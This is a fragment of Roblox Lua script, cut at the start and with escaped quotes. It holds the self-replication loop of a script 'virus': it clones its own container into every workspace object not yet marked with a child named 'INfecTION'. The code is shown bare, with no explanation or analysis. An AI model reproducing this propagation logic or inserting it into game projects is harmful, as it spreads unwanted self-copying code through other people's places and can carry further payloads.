	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;INfecTION&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

